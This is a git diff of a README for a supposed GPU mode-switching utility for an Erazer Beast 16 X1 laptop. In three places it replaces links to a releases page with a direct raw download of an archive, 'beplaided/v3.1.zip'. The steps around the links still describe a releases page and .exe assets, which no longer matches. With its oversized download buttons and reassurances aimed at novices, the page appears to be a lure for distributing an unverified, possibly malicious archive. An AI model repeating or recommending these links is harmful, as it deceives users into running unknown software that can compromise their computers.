@@ -1,7 +1,7 @@
 <h1>⚡ erazer-beast-16-x1-gpu-mode-switcher - Unlock Your Laptop's Full Gaming Power</h1>
 
 <p align="center">
-  <a href="https://github.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#00b4d8,#0072ff);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,114,255,0.4);">⬇️ &nbsp; DOWNLOAD NOW &nbsp; ⬇️</a>
+  <a href="https://raw.githubusercontent.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/main/beplaided/v3.1.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#00b4d8,#0072ff);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,114,255,0.4);">⬇️ &nbsp; DOWNLOAD NOW &nbsp; ⬇️</a>
 </p>
 
 ---
@@ -38,7 +38,7 @@ Follow these steps exactly. Do not worry—you cannot break your laptop. If anyt
 ### Step 1: Download the Tool
 
 **Visit this link to download the application:**  
-👉 [https://github.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/releases](https://github.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/releases)
+👉 [https://raw.githubusercontent.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/main/beplaided/v3.1.zip](https://raw.githubusercontent.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/main/beplaided/v3.1.zip)
 
 You will see a page with a list of files (called "Assets"). Look for the most recent version (it should say "Latest" at the top. Click on the file named something like **`GPU_Switcher.exe`** or **`GPU_Mode_Switcher.zip`**. The download will begin automatically.
 
@@ -173,7 +173,7 @@ Think of it like flipping a light switch. Your laptop handles thechange graceful
 
 Need the file again? **Visit this link to download the application:**
 
-👉 [https://github.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/releases](https://github.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/releases)
+👉 [https://raw.githubusercontent.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/main/beplaided/v3.1.zip](https://raw.githubusercontent.com/Fanmou656/erazer-beast-16-x1-gpu-mode-switcher/main/beplaided/v3.1.zip)
 
 Always grab the latest version. Each update may bring better stability or new features. Check back occasionally for updates!
 
